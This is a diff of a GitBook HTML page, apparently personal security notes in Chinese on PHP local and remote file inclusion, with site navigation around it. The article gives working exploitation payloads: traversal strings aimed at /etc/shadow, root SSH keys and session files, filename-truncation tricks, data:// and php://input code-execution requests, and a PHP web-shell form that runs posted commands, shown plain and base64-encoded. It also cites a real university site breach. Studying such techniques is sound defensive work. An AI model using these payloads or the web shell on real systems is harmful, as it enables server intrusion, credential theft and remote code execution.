+                <a href="../Git/git.html">
+            
+                    
+                    git
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.3" data-path="../Git/git_remote_operation.html">
+            
+                <a href="../Git/git_remote_operation.html">
+            
+                    
+                    git remote operation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" >
+            
+                <span>
+            
+                    
+                    Image
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.11.1" data-path="../Image/png.html">
+            
+                <a href="../Image/png.html">
+            
+                    
+                    PNG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" >
+            
+                <span>
+            
+                    
+                    JS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../JS/xhr.html">
+            
+                <a href="../JS/xhr.html">
+            
+                    
+                    XHR
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" >
+            
+                <span>
+            
+                    
+                    Note
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../Note/ctf.html">
+            
+                <a href="../Note/ctf.html">
+            
+                    
+                    CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../Note/elk.html">
+            
+                <a href="../Note/elk.html">
+            
+                    
+                    ELK
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.3" data-path="../Note/google-hacking.html">
+            
+                <a href="../Note/google-hacking.html">
+            
+                    
+                    Google Hacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.4" data-path="../Note/sql.html">
+            
+                <a href="../Note/sql.html">
+            
+                    
+                    Sql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.5" data-path="../Note/mysql.html">
+            
+                <a href="../Note/mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.6" data-path="../Note/same-origin-policy.html">
+            
+                <a href="../Note/same-origin-policy.html">
+            
+                    
+                    same origin policy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.7" data-path="../Note/software.html">
+            
+                <a href="../Note/software.html">
+            
+                    
+                    software
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" >
+            
+                <span>
+            
+                    
+                    AWS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../AWS/note.html">
+            
+                <a href="../AWS/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" >
+            
+                <span>
+            
+                    
+                    Python3
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../Python3/string.html">
+            
+                <a href="../Python3/string.html">
+            
+                    
+                    String
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16" >
+            
+                <span>
+            
+                    
+                    Simiki
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.16.1" data-path="../Simiki/simiki-命令.html">
+            
+                <a href="../Simiki/simiki-命令.html">
+            
+                    
+                    simiki 命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.2" data-path="../Simiki/start with github page.html">
+            
+                <a href="../Simiki/start with github page.html">
+            
+                    
+                    start github page
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
 </ul>
-<p>php版本小于5.2.8(?)可以成功</p>
-<p>windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了</p>
-<p>样例：</p>
-<div class="hlcode"><pre><span class="cp">&lt;?php</span>  <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>  
-
-<span class="err">#</span> <span class="nx">POC</span>
-<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/test/123.php?f=test.txt/././....../</span>
-</pre></div>
 
 
-<p>实例：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">长文件名截断: 济南大学主站本地文件包含导致代码执行</a></p>
-<p>1windows</p>
-<p>windows在文件名后加/.  或 .都是可以的</p>
-<div class="hlcode"><pre><span class="err">\</span><span class="p">.</span>
-<span class="p">.</span><span class="o">/</span>
-<span class="o">/</span>
-\
-</pre></div>
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >php 文件包含</a>
+    </h1>
+</div>
 
 
-<p>2linux</p>
-<div class="hlcode"><pre><span class="p">.</span><span class="o">/</span>
-<span class="o">/</span>
-</pre></div>
 
 
-<ul>
-<li>点号截断：</li>
-</ul>
-<p>?file=../../../../../../../../../boot.ini/......</p>
-<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
-<ul>
-<li>%00 截断包含</li>
-</ul>
-<blockquote>
-<p>gpc=off 和 php 版本限制</p>
-</blockquote>
-<h2 id="0x03">0x03 远程包含</h2>
-<p>allow_url_include=On 就是远程文件包含，Off就是本地文件包含</p>
-<blockquote>
-<p>“zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)</p>
-</blockquote>
-<h2 id="0x04-php">0x04 php 自带协议</h2>
-<h3 id="data"><strong> data:// </strong></h3>
-<p>Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur</p>
-<blockquote>
-<p>php&gt;5.2, allow_url_include=On</p>
-</blockquote>
-<div class="hlcode"><pre><span class="err">#</span> <span class="nt">base64</span> <span class="nt">decode</span> <span class="nt">is</span> <span class="s1">&#39;I love PHP\n&#39;</span>
-<span class="nt">echo</span> <span class="nt">file_get_contents</span><span class="o">(</span><span class="s1">&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;</span><span class="o">);</span>
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="0x01-&#x4E0E;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x76F8;&#x5173;&#x7684;&#x51FD;&#x6570;">0x01 &#x4E0E;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x76F8;&#x5173;&#x7684;&#x51FD;&#x6570;</h2><pre><code>require         &#x627E;&#x4E0D;&#x5230;&#x88AB;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#x4F1A;&#x4EA7;&#x751F;&#x81F4;&#x547D;&#x9519;&#x8BEF;&#xFF0C;&#x5E76;&#x505C;&#x6B62;&#x811A;&#x672C;&#x8FD0;&#x884C;&#x3002;
+include         &#x627E;&#x4E0D;&#x5230;&#x88AB;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#x53EA;&#x4F1A;&#x4EA7;&#x751F;&#x8B66;&#x544A;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;
+include_once    &#x4E0E;include&#x7C7B;&#x4F3C;&#xFF0C;&#x552F;&#x4E00;&#x533A;&#x522B;&#x662F;&#x5982;&#x679C;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x5DF2;&#x7ECF;&#x88AB;&#x5305;&#x542B;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x518D;&#x6B21;&#x5305;&#x542B;&#x3002;
+require_once    &#x4E0E;require&#x7C7B;&#x4F3C;&#xFF0C;&#x552F;&#x4E00;&#x533A;&#x522B;&#x662F;&#x5982;&#x679C;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x5DF2;&#x7ECF;&#x88AB;&#x5305;&#x542B;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x518D;&#x6B21;&#x5305;&#x542B;</code></pre>
+<h2 id="0x02-&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;lfi--local-file-include">0x02 &#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;(LFI--Local File Include)</h2><h3 id="&#x666E;&#x901A;&#x672C;&#x5730;&#x5305;&#x542B;">&#x666E;&#x901A;&#x672C;&#x5730;&#x5305;&#x542B;</h3><p>&#x53EA;&#x8981;&#x7F51;&#x7AD9;&#x652F;&#x6301;&#x4E0A;&#x4F20;&#xFF0C;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x540E;&#x7F00;&#x6587;&#x4EF6;&#xFF0C;&#x88AB;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x542B;&#x6709;&#x6548;&#x7684;php&#x4EE3;&#x7801;&#xFF0C;&#x5219;&#x5F15;&#x5165;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x6267;&#x884C;&#xFF0C;&#x82E5;&#x4E0D;&#x542B;&#x6709;&#x6548;php&#x4EE3;&#x7801;&#xFF0C;&#x5219;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</p><p>&#x6837;&#x4F8B;&#xFF1A;</p><pre><code># lfi.php
+&lt;?php include($_GET[&apos;file&apos;]); ?&gt;</code></pre>
+<p><strong> &#x5229;&#x7528; </strong></p><h4 id="&#x6CE8;&#x5165;&#x6709;&#x6548;-php-&#x4EE3;&#x7801;">&#x6CE8;&#x5165;&#x6709;&#x6548; php &#x4EE3;&#x7801;</h4><pre><code>echo &quot;&lt;?php phpinfo();&quot; &gt;&gt; lfi.txt
 
-<span class="err">#</span> <span class="nt">index</span><span class="nc">.php</span>
-<span class="o">&lt;?</span> <span class="nt">include</span><span class="o">(</span><span class="err">$</span><span class="nt">_GET</span><span class="cp">[</span><span class="s1">&#39;file&#39;</span><span class="cp">]</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="o">);</span>
+# browser
+http://127.0.0.1/lfi.php?file=lfi.txt</code></pre>
+<h4 id="&#x76EE;&#x5F55;&#x904D;&#x5386;">&#x76EE;&#x5F55;&#x904D;&#x5386;</h4><pre><code># linux &#x8FD9;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x7740;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x9700;&#x8981;root&#x6743;&#x9650;
+?file=../../../../../../../var/lib/mlocate/mlocate.db
+?file=../../../../../../../var/lib/locate.db</code></pre>
+<h4 id="&#x5305;&#x542B;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;">&#x5305;&#x542B;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;</h4><pre><code>?ile=../../../../../../../../var/log/apache/error.log</code></pre>
+<h4 id="&#x83B7;&#x53D6;web&#x76EE;&#x5F55;&#x6216;&#x914D;&#x7F6E;&#x6587;&#x4EF6;">&#x83B7;&#x53D6;web&#x76EE;&#x5F55;&#x6216;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</h4><pre><code>?file=../../../../../../../../usr/local/apache2/conf/httpd.conf</code></pre>
+<h4 id="&#x5305;&#x542B;&#x4E0A;&#x4F20;&#x9644;&#x4EF6;">&#x5305;&#x542B;&#x4E0A;&#x4F20;&#x9644;&#x4EF6;</h4><pre><code>?file=../attachment/media/xx.file</code></pre>
+<h4 id="&#x8BFB;&#x53D6;-session-&#x6587;&#x4EF6;">&#x8BFB;&#x53D6; session &#x6587;&#x4EF6;</h4><pre><code>?file=../../../../../../../tmp/sess_xxxxx</code></pre>
+<p>session&#x6587;&#x4EF6;&#x4E00;&#x822C;&#x5728;/tmp&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;sess_[your phpsessid value]&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x5728;/var/lib/php5&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x5728;&#x6B64;&#x4E4B;&#x524D;&#x5EFA;&#x8BAE;&#x5148;&#x8BFB;&#x53D6;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x5728;&#x67D0;&#x4E9B;&#x7279;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5982;&#x679C;&#x4F60;&#x80FD;&#x591F;&#x63A7;&#x5236;session&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x8BB8;&#x4F60;&#x80FD;&#x591F;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;shell</p><h4 id="&#x5982;&#x679C;&#x62E5;&#x6709;root&#x6743;&#x9650;&#x8FD8;&#x53EF;&#x4EE5;&#x8BD5;&#x8BD5;&#x8BFB;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#xFF1A;">&#x5982;&#x679C;&#x62E5;&#x6709;root&#x6743;&#x9650;&#x8FD8;&#x53EF;&#x4EE5;&#x8BD5;&#x8BD5;&#x8BFB;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#xFF1A;</h4><pre><code>/root/.ssh/authorized_keys
 
-<span class="err">#</span> <span class="nt">phpinfo</span>
-<span class="o">&lt;?</span> <span class="nt">phpinfo</span><span class="o">();</span> <span class="nt">die</span><span class="o">();?&gt;</span>
+/root/.ssh/id_rsa
 
-<span class="o">::</span><span class="nd">:php</span>
-<span class="o">//</span> <span class="nt">Base64</span> <span class="nt">Encoded</span>
-<span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">/</span><span class="nt">Pg</span><span class="o">==</span>
+/root/.ssh/id_rsa.keystore
 
-<span class="o">//</span> <span class="nt">URL</span> <span class="o">+</span> <span class="nt">Base64</span> <span class="nt">Encoded</span>
-<span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">%</span><span class="nt">2fPg</span><span class="o">==</span>
+/root/.ssh/id_rsa.pub
 
-<span class="o">//</span> <span class="nt">Final</span> <span class="nt">URL</span>
-<span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">file</span><span class="o">=</span><span class="nt">data</span><span class="o">://</span><span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="o">;</span><span class="nt">base64</span><span class="o">,</span><span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">%</span><span class="nt">2fPg</span><span class="o">==</span>
-</pre></div>
+/root/.ssh/known_hosts
 
+/etc/shadow
 
-<p>gui command shell:</p>
-<div class="hlcode"><pre><span class="err">#</span> <span class="nx">GUI</span> <span class="nb">command</span> <span class="nx">shell.</span>
+/root/.bash_history
 
-<span class="err">#</span> <span class="nx">PHP</span> <span class="nb">Payload</span>
-<span class="o">&lt;</span><span class="nb">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;&lt;?=$_SERVER[&#39;REQUEST_URI&#39;]?&gt;&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;&lt;</span><span class="nb">input</span> <span class="k">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;x&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&lt;?=htmlentities($_POST[&#39;x&#39;])?&gt;&quot;</span><span class="o">&gt;&lt;</span><span class="nb">input</span> <span class="k">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;cmd&quot;</span><span class="o">&gt;&lt;/</span><span class="nb">form</span><span class="o">&gt;&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;?</span> <span class="nx">echo</span> <span class="sb">`{$_POST[&#39;x&#39;]}`</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/pre&gt;</span><span class="cp">&lt;? die(); ?&gt;</span>
+/root/.mysql_history
+
+/proc/self/fd/fd[0-9]* (&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#x7B26;)
+
+/proc/mounts
+
+/proc/config.gz</code></pre>
+<h3 id="&#x622A;&#x65AD;&#x672C;&#x5730;&#x5305;&#x542B;">&#x622A;&#x65AD;&#x672C;&#x5730;&#x5305;&#x542B;</h3><p>&#x6837;&#x4F8B;&#xFF1A;</p><pre><code>include($a.&quot;.php&quot;);</code></pre>
+<ul><li>&#x957F;&#x6587;&#x4EF6;&#x540D;&#x622A;&#x65AD;
+</li></ul>
+<p>php&#x7248;&#x672C;&#x5C0F;&#x4E8E;5.2.8(?)&#x53EF;&#x4EE5;&#x6210;&#x529F;</p><p>windows&#x548C;linux&#x7684;&#x6587;&#x4EF6;&#x540D;&#x957F;&#x5EA6;&#x662F;&#x6709;&#x9650;&#x5236;&#x7684;&#xFF0C;&#x8D85;&#x8FC7;&#x5176;&#x957F;&#x5EA6;&#x7684;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;&#xFF0C;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;windows&#x7684;&#x622A;&#x65AD;&#x957F;&#x5EA6;&#x4E3A;260&#xFF0C;linux&#x7684;&#x957F;&#x5EA6;&#x4E3A;4096&#xFF0C;&#x8FD9;&#x4E00;&#x4E0D;&#x7528;&#x5728;&#x610F;&#x5177;&#x4F53;&#x957F;&#x5EA6;&#xFF0C;&#x53EA;&#x8981;&#x628A;&#x9700;&#x8981;&#x622A;&#x65AD;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6324;&#x5230;&#x540E;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p><p>&#x6837;&#x4F8B;&#xFF1A;</p><pre><code>&lt;?php  include_once($_GET[&apos;f&apos;].&quot;.php&quot;); ?&gt;  
+
+# POC
+http://127.0.0.1/test/123.php?f=test.txt/././....../
+</code></pre>
+<p>&#x5B9E;&#x4F8B;&#xFF1A;</p><p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236" target="_blank">&#x957F;&#x6587;&#x4EF6;&#x540D;&#x622A;&#x65AD;: &#x6D4E;&#x5357;&#x5927;&#x5B66;&#x4E3B;&#x7AD9;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x6267;&#x884C;</a></p><p>1windows</p><p>windows&#x5728;&#x6587;&#x4EF6;&#x540D;&#x540E;&#x52A0;/.  &#x6216; .&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x7684;</p><pre><code>\.
+./
+/
+\</code></pre>
+<p>2linux</p><pre><code>./
+/</code></pre>
+<ul><li>&#x70B9;&#x53F7;&#x622A;&#x65AD;&#xFF1A;
+</li></ul>
+<p>?file=../../../../../../../../../boot.ini/......</p><p>(php&#x7248;&#x672C;&#x5C0F;&#x4E8E;5.2.8(?)&#x53EF;&#x4EE5;&#x6210;&#x529F;&#xFF0C;&#x53EA;&#x9002;&#x7528;windows&#xFF0C;&#x70B9;&#x53F7;&#x9700;&#x8981;&#x957F;&#x4E8E;256)</p><ul><li>%00 &#x622A;&#x65AD;&#x5305;&#x542B;
+</li></ul>
+<blockquote><p>gpc=off &#x548C; php &#x7248;&#x672C;&#x9650;&#x5236;</p></blockquote><h2 id="0x03-&#x8FDC;&#x7A0B;&#x5305;&#x542B;">0x03 &#x8FDC;&#x7A0B;&#x5305;&#x542B;</h2><p>allow_url_include=On &#x5C31;&#x662F;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;Off&#x5C31;&#x662F;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;</p><blockquote><p>&#x201C;zlib://&#x201D;&#x548C;&#x201C;ogg://&#x201D;&#x7B49;&#x65B9;&#x5F0F;&#x7ED5;&#x8FC7; &#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;(RFI)</p></blockquote><h2 id="0x04-php-&#x81EA;&#x5E26;&#x534F;&#x8BAE;">0x04 php &#x81EA;&#x5E26;&#x534F;&#x8BAE;</h2><h3 id="data-"><strong> data:// </strong></h3><p>Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur</p><blockquote><p>php&gt;5.2, allow_url_include=On</p></blockquote><pre><code># base64 decode is &apos;I love PHP\n&apos;
+echo file_get_contents(&apos;data://text/plain;base64,SSBsb3ZlIFBIUAo=&apos;);
+
+# index.php
+&lt;? include($_GET[&apos;file&apos;] . &quot;.php&quot;);
+
+# phpinfo
+&lt;? phpinfo(); die();?&gt;
+
+:::php
+// Base64 Encoded
+PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg==
+
+// URL + Base64 Encoded
+PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
+
+// Final URL
+index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==</code></pre>
+<p>gui command shell:</p><pre><code># GUI command shell.
+
+# PHP Payload
+&lt;form action=&quot;&lt;?=$_SERVER[&apos;REQUEST_URI&apos;]?&gt;&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;x&quot; value=&quot;&lt;?=htmlentities($_POST[&apos;x&apos;])?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;cmd&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;? echo `{$_POST[&apos;x&apos;]}`; ?&gt;&lt;/pre&gt;&lt;? die(); ?&gt;
 
 # Base64 encoded payload
 
 PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=
 
 # Base64 + URL encoded payload
-PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
-</pre></div>
+PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D</code></pre>
+<h3 id="phpinput----"><strong> php://input </strong> --</h3><p>&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x53EA;&#x8BFB;&#x6D41;(&#x8FD9;&#x4E2A;&#x539F;&#x59CB;&#x6570;&#x636E;&#x6307;&#x7684;&#x662F;POST&#x6570;&#x636E;)</p><blockquote><p>php5.0&#x4EE5;&#x4E0B; &#x548C; php5.2 &#x7248;&#x672C;&#x6709;&#x6548;, allow_url_include=On</p></blockquote><p>LFI &#x5BFC;&#x81F4; code excute</p><pre><code>&lt;?php 
+&#x3000;&#x3000;@eval(file_get_contents(&apos;php://input&apos;))
+?&gt; 
+http://localhost/test/index.php
+post: system(&quot;dir&quot;);
+result: list directory</code></pre>
+<p>&#x8FD9;&#x672C;&#x8D28;&#x4E0A;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x7684;&#x5229;&#x7528;&#xFF0C;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x4E2D;&#x7684;include&#x63A5;&#x6536;&#x7684;&#x662F;&#x4E00;&#x4E2A;&quot;&#x8D44;&#x6E90;&#x5B9A;&#x4F4D;&#x7B26;&quot;&#xFF0C;&#x5728;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x4F46;&#x662F;&#x4ECE;&#x6D41;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#xFF0C;&#x8FD9;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x6D41;&#x8D44;&#x6E90;&#x5B9A;&#x4F4D;&#x7B26;&#xFF0C;&#x5373;&#x6211;&#x4EEC;&#x5C06;include&#x5F85;&#x5305;&#x542B;&#x7684;&#x8D44;&#x6E90;&#x53C8;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E86;&#x8F93;&#x5165;&#x6D41;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x8F93;&#x5165;&#x6211;&#x4EEC;&#x7684;&#x4EFB;&#x610F;code&#x5230;include&#x4E2D;</p><pre><code>&lt;?php
+&#x3000;&#x3000;@include($_GET[&quot;file&quot;]);
+?&gt;
+http://localhost/test/index.php?file=php://input
+post: &lt;?php system(&apos;ipconfig&apos;);?&gt;
+result: ip information</code></pre>
+<p>&#x6709;&#x4E00;&#x70B9;&#x8981;&#x6CE8;&#x610F;:</p><pre><code>&lt;?php echo file_get_contents(&quot;solution.php&quot;);?&gt;</code></pre>
+<p>&#x5728;&#x5229;&#x7528;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;file_get_contents&#x83B7;&#x53D6;&#x5230;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;.php&#x6587;&#x4EF6;&#xFF0C;&#x4F1A;&#x88AB;&#x5F53;&#x4F5C;include&#x7684;&#x8F93;&#x5165;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x4F1A;&#x88AB;&#x518D;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x5219;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x770B;&#x5230;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x4E86;</p><p>&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x4F7F;&#x7528;base64_encode&#x8FDB;&#x884C;&#x7F16;&#x7801;</p><pre><code>&lt;?php echo base64_encode(file_get_contents(&quot;solution.php&quot;));?&gt;</code></pre>
